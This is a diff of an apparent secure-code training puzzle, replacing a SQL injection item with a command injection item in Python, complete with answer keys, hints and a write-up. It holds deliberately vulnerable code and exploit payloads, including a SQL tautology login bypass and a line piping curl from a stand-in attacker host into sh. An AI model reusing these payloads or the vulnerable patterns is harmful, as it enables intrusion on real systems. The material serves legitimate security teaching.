@@ -1,5 +1,5 @@
 {
-  "id": "srd-0001",
+  "id": "srd-0004",
   "date": "2026-10-10",
   "difficulty": "easy",
   "language": "python",
@@ -7,62 +7,73 @@
   "snippet": {
     "files": [
       {
-        "name": "accounts.py",
-        "code": "import sqlite3\n\ndef get_db():\n    return sqlite3.connect(\"app.db\")\n\ndef find_user(username):\n    db = get_db()\n    cur = db.cursor()\n    query = \"SELECT id, email, role FROM users WHERE username = '%s'\" % username\n    cur.execute(query)\n    return cur.fetchone()\n\ndef login(username, password):\n    user = find_user(username)\n    if user is None:\n        return None\n    return check_password(user, password)\n",
+        "name": "backup.py",
+        "code": "import os\n\ndef backup_site(hostname):\n    # Ping the host, then rsync its web root into local backups.\n    os.system(\"ping -c 1 \" + hostname)\n    cmd = \"rsync -az %s:/var/www/ ./backups/%s/\" % (hostname, hostname)\n    os.system(cmd)\n    return \"./backups/\" + hostname\n\ndef handle_request(form):\n    host = form.get(\"host\")\n    return backup_site(host)\n",
         "notes": {
-          "4": "Opens a connection to the SQLite database file.",
-          "7": "Gets a cursor — the object used to run SQL statements.",
-          "9": "Builds the SQL as a string, substituting `username` straight into the text with `%`.",
-          "10": "Sends that finished string to the database engine to execute.",
-          "11": "Returns the first matching row (id, email, role), or None if there is none.",
-          "14": "Looks up the row for the submitted username before checking the password."
+          "5": "Runs `ping` by handing a string to the system shell, with `hostname` appended to it.",
+          "6": "Builds an rsync command string with the hostname substituted in twice.",
+          "7": "Runs that rsync command through the shell.",
+          "8": "Returns the local path the backup was written to.",
+          "11": "Reads the `host` field straight from the incoming request.",
+          "12": "Passes it into backup_site."
         }
       }
     ]
   },
   "stages": {
-    "line": { "file": "accounts.py", "line": 9, "yellowRadius": 2, "maxGuesses": 5 },
+    "line": {
+      "file": "backup.py",
+      "line": 5,
+      "yellowRadius": 2,
+      "maxGuesses": 5
+    },
     "bugClass": {
-      "answer": "sqli",
-      "options": ["sqli", "code-inj", "path-traversal", "idor", "command-inj"]
+      "answer": "command-inj",
+      "options": [
+        "command-inj",
+        "sqli",
+        "path-traversal",
+        "ssrf",
+        "code-inj"
+      ]
     },
     "why": {
       "answerIndex": 1,
       "options": [
         {
-          "label": "The query is slow without an index on `username`, so it times out",
-          "whyWrong": "Performance has nothing to do with it. The flaw is that input changes the query's meaning, not its speed."
+          "label": "`ping` needs root privileges, so the call fails for unprivileged web users",
+          "whyWrong": "Privilege level isn't the issue; the problem is that the shell interprets the input before anything runs."
         },
         {
-          "label": "`username` is concatenated into the SQL text, so input is parsed as SQL, not data"
+          "label": "`os.system` hands the whole assembled string to `/bin/sh`, so shell metacharacters in `hostname` run as separate commands"
         },
         {
-          "label": "`fetchone()` returns only the first row, hiding other matching users",
-          "whyWrong": "Which row is returned is irrelevant; the problem is the attacker controls the query structure in the first place."
+          "label": "The return value exposes the internal backup directory path to the user",
+          "whyWrong": "Leaking a path name is minor and unrelated to the command execution flaw."
         }
       ]
     },
     "fix": {
-      "answerIndex": 1,
+      "answerIndex": 2,
       "options": [
         {
-          "label": "Escape single quotes in the username",
-          "diff": "-    query = \"SELECT id, email, role FROM users WHERE username = '%s'\" % username\n+    safe = username.replace(\"'\", \"''\")\n+    query = \"SELECT id, email, role FROM users WHERE username = '%s'\" % safe\n    cur.execute(query)",
-          "whyWrong": "Manual quote-escaping is incomplete and easy to bypass (e.g. backslash tricks, numeric contexts). Use parameters, not escaping."
+          "label": "Quote the hostname inside the shell string",
+          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    os.system(\"ping -c 1 '\" + hostname + \"'\")",
+          "whyWrong": "Single quotes are defeated by a `'` in the input, which closes the quote and restarts command context. Quoting by hand is not a reliable boundary."
         },
         {
-          "label": "Use a parameterized query",
-          "diff": "-    query = \"SELECT id, email, role FROM users WHERE username = '%s'\" % username\n-    cur.execute(query)\n+    query = \"SELECT id, email, role FROM users WHERE username = ?\"\n+    cur.execute(query, (username,))"
+          "label": "Remove semicolons from the hostname",
+          "diff": "+    hostname = hostname.replace(\";\", \"\")\n     os.system(\"ping -c 1 \" + hostname)",
+          "whyWrong": "Shells offer many other separators (`|`, `&&`, `$(...)`, backticks, newlines). Denylisting one character leaves the rest open."
         },
         {
-          "label": "Reject usernames containing spaces",
-          "diff": "+    if \" \" in username:\n+        raise ValueError(\"invalid username\")\n    query = \"SELECT id, email, role FROM users WHERE username = '%s'\" % username",
-          "whyWrong": "A denylist of characters does not stop injection; payloads need no spaces, and valid data may contain them."
+          "label": "Pass arguments as a list with shell=False (subprocess)",
+          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    subprocess.run([\"ping\", \"-c\", \"1\", hostname], check=True)\n-    cmd = \"rsync -az %s:/var/www/ ./backups/%s/\" % (hostname, hostname)\n-    os.system(cmd)\n+    subprocess.run([\"rsync\", \"-az\", f\"{hostname}:/var/www/\", f\"./backups/{hostname}/\"], check=True)"
         },
         {
-          "label": "Wrap the query in a transaction",
-          "diff": "+    db.execute(\"BEGIN\")\n    query = \"SELECT id, email, role FROM users WHERE username = '%s'\" % username\n    cur.execute(query)\n+    db.execute(\"COMMIT\")",
-          "whyWrong": "Transactions control atomicity, not input trust. The string is still built from raw input."
+          "label": "Run the commands as an unprivileged user",
+          "diff": "-    os.system(\"ping -c 1 \" + hostname)\n+    os.system(\"sudo -u nobody ping -c 1 \" + hostname)",
+          "whyWrong": "Dropping privileges limits blast radius but the input is still parsed by a shell, so arbitrary commands still run (as nobody)."
         }
       ]
     }
@@ -73,20 +84,29 @@
     "attribution": "SourceReadle original"
   },
   "training": {
-    "exploit": "Submit the username `' OR '1'='1' -- `. The query becomes `... WHERE username = '' OR '1'='1' --'`, whose `WHERE` is always true, so `fetchone()` returns the first row in the table — often the admin. The `--` comments out the rest. No password is ever checked if `find_user` alone is trusted.",
-    "concepts": ["CWE-89", "OWASP A03:2021 Injection"],
+    "exploit": "Submit `host=localhost; curl http://evil.example/s | sh`. `ping -c 1 localhost` runs, then the shell sees the `;` and executes `curl ... | sh`, downloading and running the attacker's script as the web user. `$(...)`, backticks, `&&`, and `|` work too.",
+    "concepts": [
+      "CWE-78",
+      "OWASP A03:2021 Injection"
+    ],
     "hints": {
-      "line": "Look for the spot where untrusted input becomes part of a command's text.",
-      "bugClass": "The input ends up inside a database query.",
-      "why": "Ask what the database *parses* the username as.",
-      "fix": "The data must reach the engine as a value, not as query text."
+      "line": "Which calls pass a built-up string to the operating system?",
+      "bugClass": "The input reaches a shell, not a database.",
+      "why": "What does `/bin/sh` do with a `;` in the middle of the string?",
+      "fix": "Don't involve a shell at all — pass arguments as a list."
     }
   },
   "writeup": {
-    "summary": "`find_user` builds a SQL string with `%` formatting straight from `username`, so the input is parsed as SQL. A username of `' OR '1'='1' --` turns the `WHERE` clause into a tautology and returns the first user — often an admin. The fix passes `username` as a bound parameter (`?`), so the driver sends it as data and it can never change the query's structure. Escaping quotes by hand (option 1) looks similar but misses edge cases; parameterization is the only reliable answer.",
+    "summary": "`os.system` hands its string to `/bin/sh`, so any shell metacharacter in `hostname` is interpreted. A host of `localhost; curl evil.sh | sh` runs the attacker's command. The fix stops using a shell at all: `subprocess.run([...])` with a list passes `hostname` as a single argv element, so it can never be parsed as a command. Note line 6 has the same flaw — a complete fix converts both calls.",
     "readNext": [
-      { "label": "Python sqlite3 parameter substitution docs", "url": "https://docs.python.org/3/library/sqlite3.html#sqlite3-placeholders" },
-      { "label": "OWASP SQL Injection Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" }
+      {
+        "label": "Python subprocess security considerations",
+        "url": "https://docs.python.org/3/library/subprocess.html#security-considerations"
+      },
+      {
+        "label": "OWASP Command Injection",
+        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+      }
     ]
   }
 }
